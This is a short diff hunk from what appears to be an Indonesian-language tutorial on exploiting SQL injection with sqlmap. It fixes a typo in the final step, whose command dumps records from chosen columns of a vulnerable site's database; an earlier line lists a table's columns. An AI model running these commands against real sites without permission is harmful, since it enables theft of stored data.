@@ -51,5 +51,5 @@ sqlmap -u "linkinputvulnSqlInjection" -D [db_name] -T [table_name] --columns
 ```
 * Terakhir, Masukan perintah berikut untuk melihat record data didalam tables dari nama columns yang dipilih
 ```bash
-sqlmap -u "linkinput vulnSqlInjection" -D [db_name] -T [table_name] [name_columns,name_columns] --dump
+sqlmap -u "linkinputvulnSqlInjection" -D [db_name] -T [table_name] [name_columns,name_columns] --dump
 ```
